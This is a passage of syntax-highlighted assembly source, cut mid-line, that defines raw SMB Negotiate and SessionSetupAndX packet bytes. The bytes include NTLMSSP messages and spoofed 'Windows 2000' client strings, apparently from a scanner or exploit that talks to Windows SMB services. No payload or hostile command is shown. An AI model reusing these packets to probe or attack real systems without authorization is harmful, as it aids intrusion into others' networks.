    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x73</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x33</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x31</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x61</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x02</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x31</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2E</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x58</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x02</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x41</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x41</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x4E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x31</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x02</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x54</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x31</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc0">
</span><span class="sc5">SMB_Negotiate_LEN</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">SMB_Negotiate</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">SMB_SessionSetupAndX</span><span class="sc0">    \
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x53</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x42</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x73</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC8</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFE</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x04</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x11</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x69</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4E</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x54</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x53</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x53</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x50</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x97</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x82</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x57</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x69</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x64</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x77</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x73</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x31</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x39</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x35</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x57</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x69</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x64</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x77</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x73</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x35</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x2E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc0">
</span><span class="sc5">SMB_SessionSetupAndX_LEN</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">SMB_SessionSetupAndX</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">SMB_SessionSetupAndX2</span><span class="sc0">   \
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xDA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x53</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x42</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x73</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC8</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFE</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xDA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x04</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x11</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x57</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x9F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4E</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x54</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x53</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x53</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x50</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x46</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x47</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x47</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x8A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x88</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x48</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x44</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xED</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x41</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x27</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x86</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x26</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x59</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xB3</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x5E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xAA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x88</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x57</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x69</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x64</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x77</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x73</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x31</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x39</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x35</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x57</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x69</span><span class="sc4">,</span><span 